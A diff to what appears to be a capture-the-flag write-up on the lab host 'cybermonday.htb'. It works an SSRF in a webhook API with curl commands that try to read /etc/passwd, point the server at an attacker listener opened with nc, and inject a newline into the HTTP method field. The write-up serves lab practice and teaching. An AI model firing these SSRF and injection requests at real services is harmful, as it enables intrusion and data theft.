@@ -10,7 +10,7 @@
 
 Now that we have the ability to [[ssrf|make the web server send requests for us]], the question is what to do with it. The first thing to try would be to [[local-file-inclusion|get files on the system]]:
 ```bash
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v
+curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "file://etc/passwd", "method": "GET"}' -v
 
 {"status":"error","message":"Only http protocol is allowed"}
 ```
@@ -19,7 +19,7 @@ Not going to be that easy unfortunately. With us only being able to make [[http|
 ```bash
 nc -lvnp 8080
 
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "GET"}' -v
+curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "GET"}' -v
 
 GET / HTTP/1.1
 Host: <your ip>:8080
@@ -30,7 +30,7 @@ Hmm, not much to go on here. What about a `POST`?
 ```bash
 nc -lvnp 8080
 
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "POST"}' -v
+curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "POST"}' -v
 
 POST / HTTP/1.1
 Host: <your ip>:8080
@@ -41,7 +41,7 @@ Still very little. Well we've already tried messing around with the `url` with n
 ```bash
 nc -lvnp 8080
 
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "HMM"}' -v
+curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "HMM"}' -v
 
 HMM / HTTP/1.1
 Host: <your ip>:8080
@@ -52,7 +52,7 @@ I don't think `HMM` is a valid HTTP verb (though there are a lot more than you m
 ```bash
 nc -lvnp 8080
 
-curl http://webhooks-api-beta.cybermonday.htb/webhooks/<your guid> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "TEST\ntest 2"}' -v
+curl http://webhooks-api-beta.cybermonday.htb/webhooks/<webhook id> -H 'x-access-token: <your token>' -H 'Content-Type: application/json' -d '{"url": "http://<your ip>:8080", "method": "TEST\ntest 2"}' -v
 
 TEST
 test 2 / HTTP/1.1
